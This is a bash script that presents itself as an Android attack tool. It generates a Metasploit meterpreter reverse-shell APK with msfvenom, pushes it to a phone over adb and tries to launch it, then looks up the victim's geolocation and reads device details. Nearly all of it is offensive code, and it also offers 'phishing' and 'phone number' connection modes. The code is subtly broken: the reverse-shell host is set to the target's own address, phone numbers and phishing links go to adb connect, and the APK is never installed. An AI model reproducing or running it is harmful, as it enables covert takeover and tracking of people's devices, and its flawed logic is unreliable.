#!/bin/bash

# Function to generate a payload and send it to the target device
generate_payload() {
    local target_ip=$1
    local payload_name="payload.apk"

    # Generate a payload using msfvenom
    msfvenom -p android/meterpreter/reverse_tcp LHOST=$target_ip LPORT=4444 -o /tmp/$payload_name

    # Transfer the payload to the Android device
    adb push /tmp/$payload_name /data/local/tmp/

    # Execute the payload on the Android device
    adb shell am start -n com.metasploit.stage/.MainActivity
}

# Function to get geolocation information
get_geolocation() {
    local target_ip=$1
    local geolocation_info=$(curl -s "http://ip-api.com/json/$target_ip" | jq '.city, .region, .country')
    echo "Geolocation Information:"
    echo "$geolocation_info"
}

# Function to get device information
get_device_info() {
    echo "Device Information:"
    adb shell getprop | grep -E "ro.product.model|ro.build.version.release|ro.build.version.sdk"
}

# Main script execution
read -p "Enter the target Android device IP address, 'phishing', or 'phone': " input

if [[ $input == "phishing" ]]; then
    # Establish a connection to the Android device using a phishing link
    read -p "Enter the phishing link to connect to the Android device: " link
    adb connect $link
elif [[ $input == "phone" ]]; then
    # Establish a connection to the Android device using a phone number
    read -p "Enter the phone number to connect to the Android device: " phone_number
    adb connect $phone_number
elif [[ $input =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    # Establish a connection to the Android device using the IP address
    adb connect $input
else
    echo "Invalid input. Please enter either an IP address, 'phishing', or 'phone'."
    exit 1
fi

# Generate a payload and send it to the target device
generate_payload $input

# Get geolocation information
get_geolocation $input

# Get device information
get_device_info

# Disconnect from the Android device
adb disconnect $input

echo "Attack completed. Please check the Metasploit console for further details."